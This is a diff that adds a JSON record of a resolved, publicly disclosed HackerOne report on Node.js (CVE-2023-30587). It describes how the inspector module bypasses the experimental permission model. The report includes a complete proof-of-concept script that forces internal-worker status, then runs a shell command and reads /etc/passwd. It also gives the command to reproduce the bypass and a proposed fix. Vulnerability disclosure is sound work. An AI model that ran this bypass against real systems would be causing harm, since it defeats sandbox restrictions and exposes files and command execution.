@@ -1,0 +1,133 @@
+{
+  "id": 1962701,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTYyNzAx",
+  "url": "https://hackerone.com/reports/1962701",
+  "title": "Process-based permissions can be bypassed with the \"inspector\" module.  ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-04-26T17:50:54.790Z",
+  "submitted_at": "2023-04-26T17:50:54.899Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mattaustin",
+    "url": "/mattaustin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-30587"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-07-20T20:58:32.838Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-06-20T20:58:26.328Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\nRestrictions made with with the --experimental-permission flag can by bypassed with the built-in inspector module. \n\n**Description:** \n\nThe Worker class  can take an argument (the kIsInternal Symbol) to create an \"internal worker\" which does not respect the process level restrictions. \n\nWe cant access this Symbol('kIsInternal'); directly, however the [inspector module](https://nodejs.org/api/inspector.html) is not disabled when process level restrictions are in place.  \"The node:inspector module provides an API for interacting with the V8 inspector.\"\n\nIf we attach inspector inside the Worker constructor before `new WorkerImpl` is created we can simply change the value of \"isInternal\". \n\n## Steps To Reproduce:\n\n1. Create the following `bypass.js` file: \n\n```javascript\nconst { Session } = require('node:inspector/promises');\n\nconst session = new Session();\nsession.connect();\n\n(async ()=>{\n\tawait session.post('Debugger.enable');\n\tawait session.post('Runtime.enable');\n\n\tglobal.Worker = require('node:worker_threads').Worker;\n\t\n\tlet {result:{ objectId }} = await session.post('Runtime.evaluate', { expression: 'Worker' });\n\tlet { internalProperties } = await session.post(\"Runtime.getProperties\", { objectId: objectId });\n\tlet {value:{value:{ scriptId }}} = internalProperties.filter(prop => prop.name == '[[FunctionLocation]]')[0];\n\tlet { scriptSource } = await session.post(\"Debugger.getScriptSource\", { scriptId });\n\n\t// find the line number where WorkerImpl is called. \n\tconst lineNumber = scriptSource.substring(0, scriptSource.indexOf(\"new WorkerImpl\")).split('\\n').length;\n\n\t// WorkerImpl will bypass permission for internal modules. We can inject the local var \"isInternal = true\" with a conditional breakpoint.\n\tawait session.post(\"Debugger.setBreakpointByUrl\", {\n\t\tlineNumber: lineNumber,\n\t\turl: \"node:internal/worker\",\n\t\tcolumnNumber: 0,\n\t\tcondition: \"((isInternal = true),false)\"\n\t});\n\n\tnew Worker(`\n\t\tconst child_process = require(\"node:child_process\");\n\t\tconsole.log(child_process.execSync(\"ls -l\").toString());\n\t\t\n\t\tconsole.log(require(\"fs\").readFileSync(\"/etc/passwd\").toString())\n\t`, {\n\t\teval: true,\n\t\texecArgv: [\n\t\t\t\"--experimental-permission\",\n\t\t\t\"--allow-fs-read=*\",\n\t\t\t\"--allow-fs-write=*\",\n\t\t\t\"--allow-child-process\",\n\t\t\t\"--no-warnings\"\n\t\t]\n\t});\n\n})()\n```\n\n2. Run the following command :\n\n``` bash\nnode --experimental-permission --allow-fs-read=$(pwd) bypass.js\n```\n---\nIf the policies were not bypassed we would expect to see something like: \n\n```\nnode --experimental-permission --allow-fs-read=$(pwd) safe.js\nnode:internal/child_process:1103\n  const result = spawn_sync.spawn(options);\n                            ^\n\nError: Access to this API has been restricted\n``` \n\n## Supporting Material/References:\nIn my opinion inspector should be allowed when process level permissions are being enforced. \nI noticed there was already a flag: EnvironmentFlags::kNoCreateInspector. I took a shot at patching this  out unless ==inspect or --inspect-brk were used, but I didn't know if a more direct options like \"--allow-inspector\" would be preferred. \n\n  ``` diff\ndiff --git a/src/env.cc b/src/env.cc\nindex 571a8ed5ce..b5b7557bd1 100644\n--- a/src/env.cc\n+++ b/src/env.cc\n@@ -791,6 +791,11 @@ Environment::Environment(IsolateData* isolate_data,\n     // spawn/worker nor use addons unless explicitly allowed by the user\n     if (!options_->allow_fs_read.empty() || !options_->allow_fs_write.empty()) {\n       options_->allow_native_addons = false;\n+      DebugOptions debug_options;\n+      debug_options = options_->debug_options();\n+      if (!debug_options.inspector_enabled || !debug_options.break_first_line) {\n+        flags_ = flags_ | EnvironmentFlags::kNoCreateInspector;\n+      }\n       if (!options_->allow_child_process) {\n         permission()->Apply(\"*\", permission::PermissionScope::kChildProcess);\n       }\n```\n\n## Impact\n\nPermission Model is a mechanism for restricting access to specific resources during execution. This bypasses those restrictions.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-07-20T20:58:26.392Z",
+  "allow_singular_disclosure_after": -88452503.37942064,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "zy9ard3",
+    "mohaned0101",
+    "amr4l44",
+    "destinedtohack",
+    "salmananu",
+    "charlescado1__"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
